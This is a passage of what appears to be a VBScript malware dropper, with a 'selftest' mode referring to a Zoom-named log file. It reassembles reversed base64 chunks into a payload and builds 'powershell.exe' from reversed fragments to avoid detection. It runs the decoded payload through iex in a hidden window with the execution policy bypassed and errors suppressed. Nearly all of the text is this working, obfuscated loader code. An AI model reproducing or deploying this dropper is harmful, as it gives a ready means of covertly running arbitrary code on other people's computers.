    "KhCK0hXZUxGbBVGdpJ3V6oTXlxWaG5yTJtFIgACIgACIgoQD", _
    "uwGblh2cyV2dvBXLt92b6dCIQ1URUpjduVGJggGdhBVLul2b", _
    "7BCajRXYjBSfgACIgoQDpkCKn5WayR3UvRlLfRCIskyJn9Gb", _
    "==QfK0QMgQXa4VGIgACIK0Qf" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
